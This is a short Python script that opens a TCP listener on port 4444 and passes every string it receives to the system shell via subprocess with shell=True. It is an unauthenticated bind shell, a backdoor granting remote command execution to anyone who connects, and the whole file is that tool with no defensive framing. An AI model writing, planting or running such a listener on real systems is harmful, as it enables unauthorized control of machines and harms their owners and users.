#!/usr/bin/env python

import socket
import threading
import sys
import subprocess
bind_ip='192.168.43.33'
bind_port=4444
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((bind_ip,bind_port))
s.listen(2)
print("[*] LISTENING ON %s:%d" %(bind_ip,bind_port))

def handler(client_socket):
	message=client_socket.recv(4096).decode()
	try:
		result=subprocess.check_call(message,shell=True)
	except:
		print("[*] TRY APPROPRIATE COMMAND :))")
		sys.exit(0)

	client.close()
while True:
	client,addr=s.accept()
	print('*'*80)
	print("[*] ACCEPTED FROM %s:%d" %(addr[0],addr[1]))
	print('------------------------------')
	print("NEXT COMMAND:"+"\r\n")
	client_handler=threading.Thread(target=handler,args=(client,))
	client_handler.start()
	


